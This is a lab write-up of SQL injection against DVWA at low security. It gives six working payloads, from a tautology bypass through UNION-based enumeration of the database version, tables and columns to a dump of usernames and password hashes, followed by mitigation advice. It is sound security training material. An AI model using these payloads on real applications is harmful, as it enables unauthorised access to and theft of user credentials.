
---

# SQL Injection – DVWA Low Security

**Tester:** Areebah Khan  
**Application:** DVWA v1.10 – Low Security  
**Date:** 07/09/25

## Objective
Demonstrate SQL injection vulnerabilities and exploitation steps to extract sensitive data.

---

## Methodology
The testing was performed on the SQL Injection (Low) page of DVWA. Input was submitted via the User ID form field, and raw HTTP requests were also verified. All payloads were crafted to illustrate the consequences of unsanitized SQL queries.
1. Identify vulnerable User ID field.
2. Test payloads to confirm vulnerability.
3. Enumerate database structure.
4. Extract user credentials.

---

## Exploitation Steps

<details>
<summary>Step 1: Confirm Vulnerability</summary>

- **Payload:** `1' OR '1'='1`
- **URL Endcoded:** id=1%27%20OR%20%271%27=%271

**Observation:**
- Instead of returning a single user (ID 1), the application has returned all users in the database, including user ID's, first names, and surnames.
- The input has successfully modified the backend SQL query to always evaluate as true: SELECT first_name, last_name FROM users WHERE id = '1' OR '1'='1';

**Impact:** 
- Bypasses query constraints.
- User input is not sanitised or parameterised, allowing attackers to manipulate queries.
- In a real-world scenario, this type of injection could allow an attacker to access all user records, and potentially extract sensitive information such as usernames, passwords, and other database contents.

Working SQL injection:

<img width="940" height="644" alt="image" src="https://github.com/user-attachments/assets/7809b124-80ef-41dc-b76b-a2189bf9251e" />

<img width="940" height="878" alt="image" src="https://github.com/user-attachments/assets/73871ae2-665b-41de-85d3-5c0ee1797f6f" />


</details>

<details>
<summary>Step 2: Retrieve Database Version</summary>

- **Payload:** `1' UNION SELECT null, version() --`
- **URL Encoded:** id=1%27%20UNION%20SELECT%20null,%20version()%20--%20
  
**Observation:**
-  Database version: `10.1.26-MariaDB-0+deb9u1`
- The First name field was empty because we used null in the payload; the surname field shows the version
- The UNION SELECT payload works because DVWA Low does not sanitize input.
- It allows combining your query with the original, extracting backend information.

**Impact:** 
- Reveals backend system
- Confirms that SQL injection can be used not just to dump user data but also to enumerate database details.
- In a real application, this could help an attacker map the database structure, aiding further attacks.


<img width="940" height="625" alt="image" src="https://github.com/user-attachments/assets/785cf36c-ebbd-4ed9-99e8-1707b78b76c4" />



</details>

<details>
<summary>Step 3: Retrieve Database Name</summary>

- **Payload:** `1' UNION SELECT null, database() --`
- **URL Encoded:** id=1%27%20UNION%20SELECT%20null,%20database()%20--%20
  
**Observation:**
- Database: `dvwa`  

**Impact:**
- Targets specific tables
- Confirms that the active database can be enumerated via SQL injection

<img width="940" height="612" alt="image" src="https://github.com/user-attachments/assets/824fc852-c5c9-4ddc-acfc-93136269c9b7" />

</details>

<details>
<summary>Step 4: List Tables in the database</summary>

- **Payload:** `1' UNION SELECT null, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --`
- **URL Encoded:** id=1%27%20UNION%20SELECT%20null,%20group_concat(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20
  
**Observation:** 
- Tables: `users, guestbook`
- Queries the information_schema.tables system table to get all tables in the current database. 

**Impact:** 
- Maps database structure critical for further data extraction

<img width="756" height="491" alt="image" src="https://github.com/user-attachments/assets/edf43ccb-0b72-4283-b8dd-891c05b9a1d8" />


</details>

<details>
<summary>Step 5: List Columns in Users Table</summary>

- **Payload:** `1' UNION SELECT null, group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --`
- **URL Encoded:** id=1%27%20UNION%20SELECT%20null,%20group_concat(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name='users'%20--%20

**Observation:** 
- Columns: `user, password`
- Queries information_schema.columns to identify the schema of the users table. 

**Impact:** 
- Column enumeration allows attackers to target sensitive data fields specifically.

<img width="940" height="616" alt="image" src="https://github.com/user-attachments/assets/c4cf25a6-f08c-43e6-a1ec-6bcd28453f4f" />

</details>

<details>
<summary>Step 6: Dump Users Table</summary>

- **Payload:** `1' UNION SELECT user, password FROM users --`
- **URL Encoded:** id=1%27%20UNION%20SELECT%20user,%20password%20FROM%20users%20--%20

**Observation:** 
- Returns all usernames and password hashes
- Can now extract sensitive information from the database using SQL injection 

**Impact:** 
- Full compromise of sensitive data
- Column enumeration allows attackers to target sensitive data fields specifically.

<img width="940" height="655" alt="image" src="https://github.com/user-attachments/assets/a6ea7a6e-0d5a-4bb1-9f8c-e64deda42562" />

</details>

---

## Summary
•	DVWA Low Security is vulnerable to SQL injection.
•	All six steps demonstrate the exploitation path from query manipulation to full data extraction.
•	Real-world implications:
    o	Attackers can retrieve all users and sensitive information.
    o	Database enumeration allows mapping and further exploitation.

---

## Recommendations/Mitigations
1.	Use parameterized queries / prepared statements to prevent user input from altering SQL syntax.
2.	Sanitize and validate all inputs to block malicious payloads.
3.	Limit database privileges — avoid giving web applications full access to system tables.
4.	Implement monitoring / WAF to detect suspicious queries.

---

## Try It Yourself
To replicate this test safely:
1. Install and configure DVWA locally.
2. Navigate to **SQL Injection (Low)**.
3. Use the payloads provided in each step.  

Important: Only test in a controlled lab (like DVWA).  
Never attempt these techniques on real applications.

---

## SQL Injection Flow Diagram

```mermaid
graph LR
A[User Input] --> B[DVWA SQL Query]
B --> C{Sanitized?}
C -- No --> D[SQL Injection Success]
C -- Yes --> E[Query Safe]



